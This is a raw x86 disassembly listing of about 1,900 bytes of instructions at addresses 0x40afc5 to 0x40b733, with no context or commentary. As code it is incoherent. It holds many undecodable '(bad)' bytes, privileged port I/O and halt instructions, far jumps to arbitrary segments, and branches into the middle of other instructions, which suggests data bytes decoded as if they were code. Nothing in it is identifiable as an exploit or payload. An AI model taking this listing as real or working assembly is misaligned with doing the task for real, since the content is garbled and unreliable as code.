  40afc5:	popa   
  40afc6:	fbstp  TBYTE PTR [esi]
  40afc8:	jnp    0x40b016
  40afca:	inc    ebx
  40afcb:	in     eax,0x8d
  40afcd:	loope  0x40afee
  40afcf:	mov    bl,0xda
  40afd1:	sub    eax,0x7b8b630d
  40afd6:	daa    
  40afd7:	jmp    0x181c:0xfc0ce7d9
  40afde:	xchg   esp,eax
  40afdf:	sahf   
  40afe0:	jae    0x40afbf
  40afe2:	aaa    
  40afe3:	xor    DWORD PTR [ecx],eax
  40afe5:	sbb    bl,BYTE PTR [edi+0x18c7eb8b]
  40afeb:	out    0xb5,al
  40afed:	idiv   BYTE PTR ds:0xe660faff
  40aff3:	sbb    BYTE PTR [ebp-0x75360dac],ah
  40aff9:	and    al,BYTE PTR [ebp+0x2a]
  40affc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40affd:	jle    0x40b006
  40afff:	fadd   DWORD PTR [esi+0x49]
  40b002:	xchg   BYTE PTR [edx+0x5f],dl
  40b005:	lock jnp 0x40b019
  40b008:	hlt    
  40b009:	or     eax,ebp
  40b00b:	add    BYTE PTR [ecx-0x16b7757f],cl
  40b011:	adc    BYTE PTR [ebx],dl
  40b013:	push   esp
  40b014:	mov    esp,0x2d8fe0cc
  40b019:	mov    ebx,0x4059d919
  40b01e:	(bad)  
  40b01f:	lock push ebp
  40b021:	(bad)
  40b025:	pop    ebx
  40b026:	push   eax
  40b027:	or     BYTE PTR [edi+esi*8+0x53a51ea],bl
  40b02e:	dec    eax
  40b02f:	mov    ds:0x25dcee6d,eax
  40b034:	xor    bl,BYTE PTR [ecx]
  40b036:	sti    
  40b037:	lahf   
  40b038:	cld    
  40b039:	jg     0x40b04e
  40b03b:	jo     0x40afe4
  40b03d:	and    edx,DWORD PTR [esi]
  40b03f:	sub    eax,0x9078d450
  40b044:	pop    ebp
  40b045:	adc    ah,cl
  40b047:	sub    ebx,DWORD PTR [edi+esi*1]
  40b04a:	and    BYTE PTR [edx+0x4e4bd30c],dl
  40b050:	push   es
  40b051:	popa   
  40b052:	mov    al,0xd8
  40b054:	xor    al,0xb9
  40b056:	cmp    edi,DWORD PTR [edi-0x1c810dec]
  40b05c:	mov    dl,0x10
  40b05e:	and    bh,ch
  40b060:	(bad)  
  40b061:	pop    edx
  40b062:	fisttp QWORD PTR [esi+ecx*1]
  40b065:	in     eax,0x98
  40b067:	(bad)  
  40b068:	mov    ebx,0x621c574b
  40b06d:	mov    al,ds:0x3bedad6c
  40b072:	scas   eax,DWORD PTR es:[edi]
  40b073:	xor    ebx,DWORD PTR [edx+ecx*2-0x40656acd]
  40b07a:	fist   DWORD PTR [edi-0x12]
  40b07d:	ja     0x40b0bb
  40b07f:	sbb    eax,0xe63f94d3
  40b084:	adc    BYTE PTR [esi*1-0x50ffc934],ch
  40b08b:	shl    DWORD PTR [edx+0x20],0x9d
  40b08f:	dec    ebx
  40b090:	fcmovbe st,st(0)
  40b092:	inc    esi
  40b093:	and    ebp,DWORD PTR [eax+eiz*4+0x2457c5cb]
  40b09a:	inc    esi
  40b09b:	clc    
  40b09c:	fwait
  40b09d:	ja     0x40b064
  40b09f:	aaa    
  40b0a0:	stos   BYTE PTR es:[edi],al
  40b0a1:	call   DWORD PTR [edx]
  40b0a3:	imul   BYTE PTR [esi+ecx*8]
  40b0a6:	and    DWORD PTR [edx-0x21],esi
  40b0a9:	lods   eax,DWORD PTR ds:[esi]
  40b0aa:	xchg   ecx,eax
  40b0ab:	dec    ebp
  40b0ac:	(bad)  [edx]
  40b0ae:	fiadd  WORD PTR [eax+0x35]
  40b0b1:	pop    ebp
  40b0b2:	lds    ebp,FWORD PTR [eax]
  40b0b4:	dec    eax
  40b0b5:	xchg   edi,eax
  40b0b6:	jnp    0x40b077
  40b0b8:	fcomi  st,st(7)
  40b0ba:	(bad)  
  40b0bb:	fdiv   DWORD PTR [ebx+0x25]
  40b0be:	inc    esp
  40b0bf:	in     eax,dx
  40b0c0:	xor    eax,DWORD PTR [esp+edx*1+0x550e172a]
  40b0c7:	sbb    BYTE PTR [edi-0x6033b149],dh
  40b0cd:	sar    al,0x78
  40b0d0:	mov    dh,0x7
  40b0d2:	push   cs
  40b0d3:	sti    
  40b0d4:	fidiv  WORD PTR [edx-0x33b89dc8]
  40b0da:	std    
  40b0db:	pop    ax
  40b0dd:	push   ebx
  40b0de:	mov    ah,0x74
  40b0e0:	jge    0x40b103
  40b0e2:	or     eax,0xd259dd9b
  40b0e7:	mov    esp,0xa2a2ab3b
  40b0ec:	lahf   
  40b0ed:	test   BYTE PTR [edx-0x3dee0654],0x89
  40b0f4:	ds push ecx
  40b0f6:	mov    bl,dh
  40b0f8:	fnstcw WORD PTR [edi]
  40b0fa:	dec    edi
  40b0fb:	les    ecx,FWORD PTR [eax+edx*1]
  40b0fe:	les    eax,FWORD PTR [ecx+eax*1-0x21ea077f]
  40b105:	or     ecx,DWORD PTR [edx+0x4c]
  40b108:	push   ebx
  40b109:	mov    ch,0xe
  40b10b:	sub    BYTE PTR [edx+0x33cee408],cl
  40b111:	add    BYTE PTR [ecx-0x54],dl
  40b114:	movntq (bad),mm0
  40b115:	out    0xc4,eax
  40b117:	and    esi,DWORD PTR [esi+0x45c5e254]
  40b11d:	js     0x40b0d3
  40b11f:	pop    ecx
  40b120:	sub    BYTE PTR [ecx-0x3911a875],ah
  40b126:	repnz xor dl,0x6f
  40b12a:	(bad)  
  40b12b:	jg     0x40b149
  40b12d:	rcl    ecx,1
  40b12f:	mov    edi,0x6a8fb089
  40b134:	dec    esi
  40b135:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b136:	addr16 jg 0x40b0c7
  40b139:	fsub   DWORD PTR ds:0xe907fd58
  40b13f:	inc    ebx
  40b140:	sahf   
  40b141:	push   es
  40b142:	or     eax,0xbe35c8bc
  40b147:	push   ebp
  40b148:	div    BYTE PTR [esi]
  40b14a:	mov    al,ds:0x63cb6f3a
  40b14f:	mov    ebx,0x3e548f9f
  40b154:	pop    eax
  40b155:	out    dx,eax
  40b156:	call   0x7117100e
  40b15b:	or     edx,DWORD PTR [esi+0x4f]
  40b15e:	pop    edx
  40b15f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b160:	dec    eax
  40b161:	adc    eax,0xa7dee314
  40b166:	xor    esi,edx
  40b168:	fstp   TBYTE PTR [eax-0x2c]
  40b16b:	xor    DWORD PTR [ebp+0x57a1ed27],0x2ce5d3bc
  40b175:	inc    ebp
  40b176:	sbb    eax,esp
  40b178:	sar    bl,1
  40b17a:	or     ah,BYTE PTR [esi]
  40b17c:	(bad)  [edx+0x2d]
  40b17f:	stos   BYTE PTR es:[edi],al
  40b180:	sti    
  40b181:	fidivr DWORD PTR [esi-0x29]
  40b184:	fs sub eax,0x9d8e4c7f
  40b18a:	mov    ebp,DWORD PTR [ecx+0x12]
  40b18d:	aad    0xd3
  40b18f:	retf   0x280d
  40b192:	bound  esp,QWORD PTR [esp+esi*8]
  40b195:	mov    eax,0x4da0d27
  40b19a:	sub    ah,ah
  40b19c:	and    dh,BYTE PTR [edx-0x30763bd1]
  40b1a2:	sbb    eax,0x31eb70a8
  40b1a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b1a8:	and    BYTE PTR [esi+0x6b],cl
  40b1ab:	jge    0x40b165
  40b1ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b1ae:	sbb    ebp,DWORD PTR [esi]
  40b1b0:	push   es
  40b1b1:	inc    ebx
  40b1b2:	pop    ebx
  40b1b3:	ret    
  40b1b4:	bound  edx,QWORD PTR [eax-0x1955a926]
  40b1ba:	jno    0x40b1a8
  40b1bc:	fistp  WORD PTR [edx+0x4e]
  40b1bf:	and    DWORD PTR ss:[edi-0x67],esp
  40b1c3:	xchg   edx,eax
  40b1c4:	lock xchg esi,eax
  40b1c6:	cmp    ecx,ebp
  40b1c8:	dec    ecx
  40b1c9:	(bad)  
  40b1ca:	repnz loop 0x40b1d5
  40b1cd:	jbe    0x40b23b
  40b1cf:	jl     0x40b1a9
  40b1d1:	add    BYTE PTR [esi+0x5ac8ed14],cl
  40b1d7:	popa   
  40b1d8:	add    BYTE PTR [esi-0x62],bh
  40b1db:	and    esp,DWORD PTR [eax-0x49]
  40b1de:	cmp    al,0xc6
  40b1e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b1e1:	mov    cl,0xfa
  40b1e3:	rol    DWORD PTR [edi-0x97481ed],cl
  40b1e9:	and    DWORD PTR [esi],edi
  40b1eb:	mov    ?,WORD PTR [ecx-0x6a884ad2]
  40b1f1:	es stos BYTE PTR es:[edi],al
  40b1f3:	adc    esi,DWORD PTR [ebp+0x43ba5b05]
  40b1f9:	ins    BYTE PTR es:[edi],dx
  40b1fa:	push   0x61
  40b1fc:	pop    ebx
  40b1fd:	lea    esp,[ecx-0x6245c662]
  40b203:	mov    al,al
  40b205:	shl    DWORD PTR [eax],0x28
  40b208:	jle    0x40b1e3
  40b20a:	ja     0x40b1a4
  40b20c:	push   ecx
  40b20d:	mov    cl,0x83
  40b20f:	and    BYTE PTR [ecx+0x353e026e],0x3a
  40b216:	xchg   edi,eax
  40b217:	shl    BYTE PTR [ecx+ecx*2],cl
  40b21a:	aad    0xd7
  40b21c:	mov    edx,0xa6614903
  40b221:	sub    al,0x95
  40b223:	test   BYTE PTR [ebx+0x2a],al
  40b226:	pop    edi
  40b227:	ins    BYTE PTR es:[edi],dx
  40b228:	(bad)  
  40b229:	jnp    0x40b281
  40b22b:	clc    
  40b22c:	or     eax,0x3fd303ca
  40b231:	push   ss
  40b232:	stos   BYTE PTR es:[edi],al
  40b233:	arpl   WORD PTR [eax+eax*4],di
  40b236:	mov    ecx,0xa5c92cf7
  40b23b:	rol    cl,cl
  40b23d:	(bad)  
  40b23f:	mov    esp,0x33dc80ef
  40b244:	adc    eax,0xcc24d6ed
  40b249:	ja     0x40b215
  40b24b:	pop    edx
  40b24c:	shl    DWORD PTR [esi-0x4b9ff20],cl
  40b252:	pop    ds
  40b253:	fucomp st(1)
  40b255:	xor    DWORD PTR [esi],ebp
  40b257:	loop   0x40b2cc
  40b259:	adc    al,0x2
  40b25b:	mov    esp,0xa6ad3908
  40b260:	pop    edx
  40b261:	add    eax,0x1f53f43d
  40b266:	fisub  DWORD PTR [ecx-0x50]
  40b269:	jns    0x40b2c8
  40b26b:	fcomi  st,st(4)
  40b26d:	test   bl,0x6b
  40b270:	clc    
  40b271:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b272:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b273:	iret   
  40b274:	aas    
  40b275:	dec    edi
  40b276:	mov    eax,ds:0x2ff469c6
  40b27b:	ins    DWORD PTR es:[edi],dx
  40b27c:	jg     0x40b247
  40b27e:	pop    esi
  40b27f:	ss js  0x40b278
  40b282:	bound  edi,QWORD PTR [edi+0x509fcd60]
  40b288:	test   DWORD PTR ds:0x85e4d6d6,esp
  40b28e:	lods   eax,DWORD PTR ds:[esi]
  40b28f:	(bad)  
  40b290:	loope  0x40b2db
  40b292:	mov    edi,0x82e7586f
  40b297:	cmp    eax,0xe3568735
  40b29c:	(bad)  
  40b29d:	jge    0x40b2ae
  40b29f:	push   edx
  40b2a0:	cwde   
  40b2a1:	adc    DWORD PTR [ecx+0x4f5c6d04],edx
  40b2a7:	and    BYTE PTR [ebp-0x1b9741de],bl
  40b2ad:	sub    BYTE PTR [eax+ebx*2+0x27fed7c5],dl
  40b2b4:	imul   ebx,DWORD PTR [ebx-0x747feb6d],0x40040b8f
  40b2be:	ins    BYTE PTR es:[edi],dx
  40b2bf:	xor    al,al
  40b2c1:	repnz (bad) 
  40b2c3:	mov    dh,0xf3
  40b2c5:	adc    DWORD PTR [edi],0x3f
  40b2c8:	inc    esi
  40b2c9:	lea    edi,[esi+esi*1+0x49]
  40b2cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b2ce:	shr    BYTE PTR [eax],1
  40b2d0:	push   ebp
  40b2d1:	pop    eax
  40b2d2:	mov    dl,0x3c
  40b2d4:	cmp    al,0xdc
  40b2d6:	aas    
  40b2d7:	xchg   edi,ebx
  40b2d9:	lock sbb eax,DWORD PTR [ecx-0x27]
  40b2dd:	ins    DWORD PTR es:[edi],dx
  40b2de:	rcl    BYTE PTR [esi-0xc],0x7f
  40b2e2:	jns    0x40b2c4
  40b2e4:	pop    esi
  40b2e5:	cmp    BYTE PTR [ecx-0x7c4fc929],ch
  40b2eb:	fstp   QWORD PTR [edx+eax*1]
  40b2ee:	push   ds
  40b2ef:	and    BYTE PTR [esp+ebx*1+0x31],0x72
  40b2f4:	xchg   ecx,eax
  40b2f5:	fs addr16 js 0x40b362
  40b2f9:	mov    eax,0x53bc8f85
  40b2fe:	push   0x93bf3518
  40b303:	lahf   
  40b304:	adc    eax,0xdd52020d
  40b309:	inc    esi
  40b30a:	dec    edx
  40b30b:	out    dx,eax
  40b30c:	add    eax,0xf30601da
  40b311:	add    DWORD PTR [edx+eax*1],esi
  40b314:	ret    
  40b315:	mov    edi,0xfd684065
  40b31a:	popa   
  40b31b:	retf   0xc85d
  40b31e:	add    al,0x19
  40b320:	xor    BYTE PTR [ebx+0x51332811],ah
  40b326:	ja     0x40b2cd
  40b328:	fld    st(1)
  40b32a:	arpl   WORD PTR [edi+0x17],si
  40b32d:	fcomp  QWORD PTR [eax]
  40b32f:	sub    esi,DWORD PTR [edi]
  40b331:	sub    eax,0xca0811ce
  40b336:	pop    es
  40b337:	pusha  
  40b338:	daa    
  40b339:	ja     0x40b2ff
  40b33b:	test   eax,0x743db89
  40b340:	inc    esp
  40b341:	push   esp
  40b342:	ror    BYTE PTR [ebx-0x1226e99d],cl
  40b348:	pop    esi
  40b349:	addr16 in al,dx
  40b34b:	inc    esp
  40b34c:	outs   dx,DWORD PTR ds:[esi]
  40b34d:	sub    bh,BYTE PTR [edi-0x3acf2335]
  40b353:	pop    esp
  40b354:	pop    edi
  40b355:	int    0x1
  40b357:	sar    DWORD PTR [esi+0x3d820586],1
  40b35d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b35e:	es xchg ebx,eax
  40b360:	sbb    eax,0x5bcb62b5
  40b365:	adc    DWORD PTR [ebx-0x56],ebp
  40b368:	push   0xffffffe6
  40b36a:	pop    ebp
  40b36b:	lahf   
  40b36c:	loopne 0x40b378
  40b36e:	cmp    DWORD PTR [ecx-0x40],esp
  40b371:	sbb    al,0xa7
  40b373:	jmp    0x40b3dc
  40b375:	in     eax,dx
  40b376:	call   0x51516b67
  40b37b:	in     eax,dx
  40b37c:	cmp    DWORD PTR [ebx+esi*2-0x60f3d440],ebx
  40b383:	sbb    al,bl
  40b385:	mov    ch,al
  40b387:	orps   xmm6,XMMWORD PTR [edi]
  40b38a:	push   ds
  40b38b:	pushf  
  40b38c:	push   ebp
  40b38d:	pop    ds
  40b38e:	fisttp DWORD PTR [ebp-0x6ac25350]
  40b394:	push   esp
  40b395:	or     edi,ebp
  40b397:	cli    
  40b398:	push   ecx
  40b399:	aaa    
  40b39a:	mov    dl,BYTE PTR [ebx+0x68]
  40b39d:	push   esi
  40b39e:	dec    ebp
  40b39f:	ret    0xcbb6
  40b3a2:	push   ebx
  40b3a3:	adc    dl,BYTE PTR [edi-0x625d7f15]
  40b3a9:	add    esi,0xffffffc8
  40b3ac:	popf   
  40b3ad:	call   0xf2f:0xf50b3f4c
  40b3b4:	dec    esi
  40b3b5:	xor    dh,ch
  40b3b7:	pop    edx
  40b3b8:	or     edi,DWORD PTR [edi+ebp*4-0x56]
  40b3bc:	pop    ds
  40b3bd:	inc    edi
  40b3be:	pop    es
  40b3bf:	(bad)  
  40b3c0:	call   DWORD PTR [ebp-0x2d39f84b]
  40b3c6:	les    ecx,FWORD PTR [edi+0x3b9422d5]
  40b3cc:	iret   
  40b3cd:	mov    bh,0x55
  40b3cf:	jbe    0x40b3a1
  40b3d1:	push   0xa1e342e9
  40b3d6:	dec    eax
  40b3d7:	mulps  xmm5,xmm7
  40b3da:	js     0x40b37f
  40b3dc:	aaa    
  40b3dd:	daa    
  40b3de:	aad    0x26
  40b3e0:	dec    ecx
  40b3e1:	jp     0x40b461
  40b3e3:	fcmovnbe st,st(2)
  40b3e5:	lods   al,BYTE PTR ds:[esi]
  40b3e6:	(bad)  
  40b3e7:	jo     0x40b3d9
  40b3e9:	xor    eax,0x40b149eb
  40b3ee:	test   al,0xba
  40b3f0:	push   0xa7e6b014
  40b3f5:	push   es
  40b3f6:	jle    0x40b426
  40b3f8:	xchg   DWORD PTR [eax+0x59843f0f],eax
  40b3fe:	dec    esp
  40b3ff:	pop    es
  40b400:	mov    ecx,0x4c1664bb
  40b405:	xor    al,0x4a
  40b407:	repnz mov BYTE PTR [ebp-0x74],ch
  40b40b:	ret    0xb334
  40b40e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b40f:	imul   ecx,DWORD PTR [esi+eiz*8],0xffffff85
  40b413:	xchg   esi,eax
  40b414:	mov    esi,0xab1f455d
  40b419:	stc    
  40b41a:	out    0x9,eax
  40b41c:	mov    esp,0xf642b7cc
  40b421:	cmp    edi,DWORD PTR [eax]
  40b423:	adc    dl,dl
  40b425:	imul   edi,DWORD PTR [eax],0xd3702bcc
  40b42b:	jmp    0x2de1:0x77ddea7f
  40b432:	cli    
  40b433:	jl     0x40b44f
  40b435:	es ja  0x40b4b6
  40b438:	div    DWORD PTR [esp+ecx*2-0x2]
  40b43c:	adc    eax,0xc0504cf2
  40b441:	dec    ebp
  40b442:	sub    cl,BYTE PTR [ebp+0x4622130b]
  40b448:	fiadd  DWORD PTR [edi+0x6c]
  40b44b:	std    
  40b44c:	arpl   di,bx
  40b44e:	adc    DWORD PTR [eax+0xa],esp
  40b451:	cs rol ebp,cl
  40b454:	dec    ebx
  40b455:	and    dl,BYTE PTR [eax+0x5f]
  40b458:	test   eax,esi
  40b45a:	daa    
  40b45b:	aas    
  40b45c:	outs   dx,BYTE PTR ds:[esi]
  40b45d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b45e:	and    ch,BYTE PTR [ecx-0x34]
  40b461:	hlt    
  40b462:	out    0x79,al
  40b464:	pushf  
  40b465:	or     ebx,DWORD PTR [ebx+0x51a1526b]
  40b46b:	aaa    
  40b46c:	mov    esi,0xcc2b32e1
  40b471:	in     al,0x64
  40b473:	mov    al,0xed
  40b475:	jle    0x40b4f0
  40b477:	ins    DWORD PTR es:[edi],dx
  40b478:	test   BYTE PTR [ebx],dl
  40b47a:	loopne 0x40b3fd
  40b47c:	call   0xb918:0xa3c6ad5c
  40b483:	and    ebx,DWORD PTR [ebx-0x7f]
  40b486:	dec    eax
  40b487:	mov    ebp,0x1213dbe7
  40b48c:	jle    0x40b478
  40b48e:	out    0x70,eax
  40b490:	das    
  40b491:	bswap  ebp
  40b493:	mov    ecx,DWORD PTR [esi]
  40b495:	test   DWORD PTR [esi+0x41573bb8],0x35b75abf
  40b49f:	into   
  40b4a0:	pop    eax
  40b4a1:	xchg   ebp,eax
  40b4a2:	into   
  40b4a3:	rol    BYTE PTR [eax],1
  40b4a5:	add    DWORD PTR [edx-0x5c89c885],ebp
  40b4ab:	pop    edi
  40b4ac:	pushf  
  40b4ad:	xor    ecx,DWORD PTR [esi]
  40b4af:	cdq    
  40b4b0:	cmp    bl,al
  40b4b2:	pop    ss
  40b4b3:	adc    eax,0x67837927
  40b4b8:	fsubr  QWORD PTR [ebx+0x443a389c]
  40b4be:	dec    BYTE PTR [edx+0x2169eaf0]
  40b4c4:	stos   DWORD PTR es:[edi],eax
  40b4c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b4c6:	mov    ebx,0x44099580
  40b4cb:	jmp    0xb6b9:0x2fce5b5f
  40b4d2:	xlat   BYTE PTR ds:[ebx]
  40b4d3:	xor    ah,BYTE PTR [edx]
  40b4d5:	mov    eax,ds:0x162b8230
  40b4da:	jmp    0x40b4c0
  40b4dc:	repz shl DWORD PTR [edi+ebx*2+0x4b],cl
  40b4e1:	mov    ah,0xfa
  40b4e3:	pop    ds
  40b4e4:	addr16 ds pop ebx
  40b4e7:	dec    edx
  40b4e8:	pop    ecx
  40b4e9:	bnd jp 0x40b471
  40b4ec:	pop    eax
  40b4ed:	(bad)  
  40b4ee:	std    
  40b4ef:	popa   
  40b4f0:	out    0xe7,eax
  40b4f2:	push   esp
  40b4f3:	xor    edi,esp
  40b4f5:	cmp    BYTE PTR [eax],ah
  40b4f7:	xchg   ebx,eax
  40b4f8:	ja     0x40b4fb
  40b4fa:	mov    edx,0x240f7d36
  40b4ff:	jns    0x40b4d0
  40b501:	outs   dx,BYTE PTR ds:[esi]
  40b502:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b503:	std    
  40b504:	adc    DWORD PTR [ebp-0x3ddc4063],edx
  40b50a:	pop    es
  40b50b:	loopne 0x40b51c
  40b50d:	jge    0x40b576
  40b50f:	in     al,0xe5
  40b511:	dec    ebx
  40b512:	mov    edx,0x46153c6b
  40b517:	dec    ebx
  40b518:	loopne 0x40b573
  40b51a:	lock test eax,0x87296215
  40b520:	jl     0x40b557
  40b522:	pop    ss
  40b523:	nop
  40b524:	outs   dx,DWORD PTR ds:[esi]
  40b525:	and    al,0xd2
  40b527:	sti    
  40b528:	push   ebx
  40b529:	push   0xa5566b89
  40b52e:	jg     0x40b4e7
  40b530:	mov    al,ds:0x9a044dc9
  40b535:	adc    bl,BYTE PTR [ecx]
  40b537:	xor    BYTE PTR [ecx-0x307fe678],ah
  40b53d:	std    
  40b53e:	push   es
  40b53f:	xchg   edi,eax
  40b540:	jmp    0xe5c3:0xabac8937
  40b547:	lock mov ecx,0x3275aa04
  40b54d:	cmp    BYTE PTR [edi-0x7d],al
  40b550:	add    BYTE PTR [edi],0x2e
  40b553:	add    al,0xe4
  40b555:	fisttp DWORD PTR [edx]
  40b557:	ss popf 
  40b559:	sub    al,0xd3
  40b55b:	mov    al,0x5f
  40b55d:	inc    esi
  40b55e:	sub    BYTE PTR [edi],ah
  40b560:	ret    
  40b561:	or     BYTE PTR [ecx+ebx*1-0xb5acb63],al
  40b568:	shr    BYTE PTR [edx+0x3],0xb3
  40b56c:	(bad)  
  40b56d:	mov    ch,0x17
  40b56f:	push   esi
  40b570:	or     al,0x78
  40b572:	sbb    ebx,ebx
  40b574:	xor    ecx,DWORD PTR [ebp-0x4bc02bde]
  40b57a:	out    0x1d,al
  40b57c:	push   es
  40b57d:	cmp    al,dl
  40b57f:	fist   WORD PTR [ebp-0x79bc28b]
  40b585:	psubusb mm6,QWORD PTR [ecx]
  40b588:	aad    0x37
  40b58a:	lea    eax,[edi+0x29709410]
  40b590:	cmp    bh,ah
  40b592:	inc    esi
  40b593:	jge    0x40b58e
  40b595:	ins    DWORD PTR es:[edi],dx
  40b596:	sub    BYTE PTR [ebx-0x4675d866],ch
  40b59c:	dec    eax
  40b59d:	into   
  40b59e:	mov    ebp,0xf4b9796a
  40b5a3:	in     al,dx
  40b5a4:	pop    eax
  40b5a5:	ficomp WORD PTR [esp+edi*4+0x1f]
  40b5a9:	fnstsw WORD PTR [ecx+0x66415455]
  40b5af:	mov    ah,0xdd
  40b5b1:	adc    ecx,ebx
  40b5b3:	dec    eax
  40b5b4:	inc    ebp
  40b5b5:	jmp    0xb9336d43
  40b5ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b5bb:	ja     0x40b551
  40b5bd:	loope  0x40b59a
  40b5bf:	xor    cl,BYTE PTR [esi+ecx*8]
  40b5c2:	aad    0x9a
  40b5c4:	xor    al,0xe5
  40b5c6:	hlt    
  40b5c7:	aad    0x79
  40b5c9:	dec    eax
  40b5ca:	sbb    al,0x15
  40b5cc:	add    DWORD PTR [eax],eax
  40b5ce:	in     al,dx
  40b5cf:	sub    al,0xef
  40b5d1:	cli    
  40b5d2:	in     al,dx
  40b5d3:	mov    ebx,ebx
  40b5d5:	ror    BYTE PTR [esp+esi*8],0xfd
  40b5d9:	xchg   edx,eax
  40b5da:	lods   eax,DWORD PTR ss:[si]
  40b5dd:	in     al,dx
  40b5de:	das    
  40b5df:	mov    eax,0x6f55c9bc
  40b5e4:	push   ds
  40b5e5:	xchg   edx,eax
  40b5e6:	sub    ch,BYTE PTR [ebx]
  40b5e8:	xchg   ecx,eax
  40b5e9:	add    eax,0x62ec2dbc
  40b5ee:	ins    DWORD PTR es:[edi],dx
  40b5ef:	mov    bl,0xa7
  40b5f1:	or     ebx,DWORD PTR [edx+0x6206f3bd]
  40b5f7:	scas   al,BYTE PTR es:[edi]
  40b5f8:	jmp    0x40b5f7
  40b5fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b5fb:	push   ebx
  40b5fc:	pop    ebp
  40b5fd:	cmp    eax,0x4cc62a11
  40b602:	out    dx,eax
  40b603:	out    dx,eax
  40b604:	test   DWORD PTR [edx-0x2a],ebx
  40b607:	add    al,0x58
  40b609:	jg     0x40b5da
  40b60b:	add    eax,0xc26b174f
  40b610:	mov    bl,0xf6
  40b612:	adc    eax,0xbb807c76
  40b617:	lea    esp,[eax]
  40b619:	sar    DWORD PTR ds:0x166659f2,cl
  40b61f:	(bad)  
  40b620:	jmp    0x1e43faea
  40b625:	mov    edi,0x165b91a1
  40b62a:	mov    dh,0x10
  40b62c:	inc    edx
  40b62d:	cmp    edx,ebx
  40b62f:	cmc    
  40b630:	bound  edi,QWORD PTR [edx-0x68]
  40b633:	loope  0x40b61b
  40b635:	xor    DWORD PTR [esi],esi
  40b637:	cmp    ecx,DWORD PTR [edx-0x5b]
  40b63a:	fisttp WORD PTR [ecx]
  40b63c:	jge    0x40b5d0
  40b63e:	es dec ecx
  40b640:	retf   0x90cd
  40b643:	mov    al,0x4e
  40b645:	push   cs
  40b646:	fsub   DWORD PTR ds:0x125e79
  40b64c:	fstp   QWORD PTR [eax+0x2e40663e]
  40b652:	mov    esp,DWORD PTR [ebp+0x7637a692]
  40b658:	das    
  40b659:	(bad)
  40b65d:	jnp    0x40b5e2
  40b65f:	inc    ecx
  40b660:	jl     0x40b6d4
  40b662:	fistp  QWORD PTR [ebx+0x5caff48f]
  40b668:	call   0x2f55:0x5416b000
  40b66f:	lea    ebp,[esi-0x6be77607]
  40b675:	xchg   DWORD PTR [ecx+0x65],edi
  40b678:	lods   eax,DWORD PTR ds:[esi]
  40b679:	jp     0x40b6b1
  40b67b:	sub    al,0x6c
  40b67d:	jno    0x40b6f1
  40b67f:	push   0x37
  40b681:	jle    0x40b700
  40b683:	xchg   esi,eax
  40b684:	int3   
  40b685:	lock push es
  40b687:	mov    WORD PTR [eax],gs
  40b689:	out    dx,eax
  40b68a:	push   ss
  40b68b:	dec    esp
  40b68c:	cld    
  40b68d:	xor    ebx,edx
  40b68f:	cdq    
  40b690:	xor    BYTE PTR [eax],al
  40b692:	push   0x6516bd01
  40b697:	mov    ss,eax
  40b699:	xor    eax,0x860f549e
  40b69e:	(bad)  
  40b69f:	pop    edx
  40b6a0:	inc    esi
  40b6a1:	fwait
  40b6a2:	cmp    esi,DWORD PTR [esi]
  40b6a4:	fucomi st,st(7)
  40b6a6:	jnp    0x40b66f
  40b6a8:	sbb    al,BYTE PTR [ebp-0x34]
  40b6ab:	pop    esp
  40b6ac:	or     BYTE PTR [eax-0x7e16e761],ch
  40b6b2:	xchg   DWORD PTR [edi-0x5095c660],ebp
  40b6b8:	xchg   esp,eax
  40b6b9:	push   0x7f
  40b6bb:	sub    bh,BYTE PTR [esi]
  40b6bd:	in     al,dx
  40b6be:	cmp    eax,0xf5db975
  40b6c3:	sbb    DWORD PTR [esi],eax
  40b6c5:	adc    al,0x95
  40b6c7:	xchg   edi,eax
  40b6c8:	mov    al,0xe0
  40b6ca:	jb     0x40b6f6
  40b6cc:	dec    ebx
  40b6cd:	sub    BYTE PTR [edx-0x73edcb3a],0xec
  40b6d4:	imul   ebx,DWORD PTR ds:0xe9872feb,0xffffff8d
  40b6db:	mov    DWORD PTR [ebp+0x577b5c4d],esi
  40b6e1:	daa    
  40b6e2:	inc    edx
  40b6e3:	mov    al,0xa3
  40b6e5:	or     BYTE PTR [eax+0x5f],cl
  40b6e8:	outs   dx,DWORD PTR ds:[esi]
  40b6e9:	mov    ebp,0xb460b208
  40b6ee:	push   edx
  40b6ef:	icebp  
  40b6f0:	lock daa 
  40b6f2:	xchg   DWORD PTR [esi+0x1b],eax
  40b6f5:	ss and eax,0xb11180b1
  40b6fb:	mov    BYTE PTR [esi+0x2c],bl
  40b6fe:	push   ebp
  40b6ff:	xchg   ecx,esp
  40b701:	(bad)  
  40b702:	xor    dh,cl
  40b704:	jle    0x40b727
  40b706:	shr    DWORD PTR [ecx],1
  40b708:	push   0x33
  40b70a:	mov    edi,cs
  40b70c:	sbb    BYTE PTR [esi],0x37
  40b70f:	xor    BYTE PTR [ebp-0x69],bh
  40b712:	push   cs
  40b713:	out    0x36,eax
  40b715:	mov    edx,fs
  40b717:	aaa    
  40b718:	push   edx
  40b719:	inc    eax
  40b71a:	sbb    bl,BYTE PTR [ecx+0x3]
  40b71d:	sub    ch,BYTE PTR [eax]
  40b71f:	cmp    ebp,DWORD PTR [ecx+0x41]
  40b722:	out    0xb9,eax
  40b724:	test   DWORD PTR [ecx+eax*8+0x6c],esi
  40b728:	xchg   DWORD PTR [esi-0x80],edx
  40b72b:	out    dx,eax
  40b72c:	out    0xa4,eax
  40b72e:	cmp    al,0x19
  40b730:	push   ebp
  40b731:	mov    ah,0xa6
  40b733:	sbb    DWORD PTR [ebx],eax
